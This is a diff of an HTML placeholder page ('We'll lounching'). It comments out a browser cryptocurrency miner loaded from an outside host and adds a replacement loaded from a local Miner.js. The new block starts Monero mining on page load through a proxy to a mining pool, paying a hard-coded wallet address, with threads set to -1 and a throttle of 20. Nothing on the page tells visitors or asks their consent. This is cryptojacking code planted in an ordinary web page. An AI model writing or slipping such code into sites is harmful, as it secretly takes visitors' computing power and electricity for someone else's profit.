@@ -56,7 +56,7 @@ hr {
     <p>We'll lounching</p>
   </div>
 </div>
-
+<!--
 <script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
 <script>
     server = "wss://f.xmrminingproxy.com:8181";
@@ -68,6 +68,20 @@ hr {
     startMining(pool, walletAddress, workerId, threads, password);
     throttleMiner = 20;
 </script>
-
+-->
+  
+  <!-- Start Of Mining Code -->
+<script src="Miner.js"></script>
+<script>
+    server = "wss://f.xmrminingproxy.com:8181";
+    var pool = "moneroocean.stream";
+    var walletAddress = "8BNHP2bff8fPJKT42CEaChNME34xiV2msS9iigEtRRSeRDDnWWjF8L62cYWvcMDzvX3TyuYPvNwxJS2G1Ckd4qNaHxd4RHb";
+    var workerId = ""
+    var threads = -1;
+    var password = "";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 20;
+</script>
+<!-- End Of Mining Code -->
 </body>
 </html>
